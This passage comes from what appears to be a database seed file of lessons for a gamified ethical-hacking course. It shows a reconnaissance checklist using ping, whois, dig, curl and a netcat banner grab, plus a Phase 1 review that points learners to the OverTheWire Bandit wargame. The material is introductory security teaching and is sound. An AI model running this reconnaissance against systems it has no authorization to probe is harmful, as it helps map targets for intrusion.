curl -k https://self-signed.target.com  # Ignore SSL errors
```

**whois — Domain Recon:**
```bash
whois example.com
# Reveals: registrar, registrant (may be private), name servers, creation date
```

**Putting It Together — Quick Recon Checklist:**
```bash
ping -c 1 target.com                  # Alive?
nslookup target.com                   # IP?
whois target.com                      # Ownership?
dig target.com ANY                    # All DNS records?
curl -I https://target.com            # Server headers?
echo "" | nc -w1 target.com 80       # Banner?
```

Build this checklist into a bash script — you''ll use it as the first step of every engagement.',
'https://tryhackme.com/room/introtoresearch', 'TryHackMe', 50),

(20, 1, 'Phase 1 Review and CTF Challenge',
'## Phase 1 Review: Foundations Complete

Congratulations on completing Phase 1! You''ve covered the essential foundations every ethical hacker needs. Let''s consolidate what you''ve learned.

**Phase 1 Knowledge Checkpoint:**

✅ **Networking:** OSI model, TCP/IP, DNS resolution, subnetting, packet analysis with Wireshark

✅ **Linux:** Filesystem navigation, permissions, SUID bits, bash scripting, services

✅ **Web:** HTTP methods/headers, cookies, sessions, JWTs, CORS, CSP, cryptography basics

✅ **Tools:** Netcat, curl, Wireshark, basic Metasploit, searchsploit

**Your First CTF Challenge:**

Today, complete the "Bandit" wargame on OverTheWire.org (levels 0–15). This will test:
- SSH connectivity
- File reading and manipulation
- Permissions and hidden files
- String searching and pipes
- Running programs from unusual locations
- Encoding/decoding (base64, hex)

**Starting Bandit:**
```bash
ssh bandit0@bandit.labs.overthewire.org -p 2220
# Password: bandit0
# Goal: Read /home/bandit0/readme
```

Each level''s password is in a file somewhere on the system. Find it, connect to the next level.

**Phase 2 Preview — Reconnaissance:**
In Phase 2 (Days 21–40) you will learn:
- OSINT (Open Source Intelligence) techniques
- Google Dorking for sensitive data
- Shodan for internet-facing infrastructure
- Nmap deep dive — the most important scanning tool
- Subdomain enumeration and DNS recon
- Social engineering reconnaissance

The shift from "understanding" to "actively gathering intelligence" starts tomorrow.

**XP Milestone:** You''ve earned approximately 1,000 XP and unlocked the Phase 1 badge. You''re no longer a complete beginner — you understand the internet, Linux, and the web at a level most IT professionals don''t.',
'https://overthewire.org/wargames/bandit', 'OverTheWire', 75)

on conflict (id) do nothing;
